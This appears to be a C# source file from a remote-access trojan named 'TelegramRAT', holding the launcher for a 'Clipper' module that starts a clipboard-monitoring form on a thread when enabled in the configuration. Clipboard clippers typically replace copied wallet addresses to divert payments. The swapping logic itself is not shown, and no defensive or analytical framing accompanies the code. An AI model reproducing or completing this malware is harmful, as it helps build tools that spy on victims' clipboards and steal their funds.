using System;
using System.Threading;
using System.Windows.Forms;

namespace TelegramRAT;

internal static class Clipper
{
	public static void Run()
	{
		if (config.ClipperEnabled)
		{
			Console.WriteLine("[+] Clipper is starting...");
			new Thread((ThreadStart)delegate
			{
				Application.Run((Form)(object)new ClipboardNotification.NotificationForm());
			}).Start();
		}
	}
}
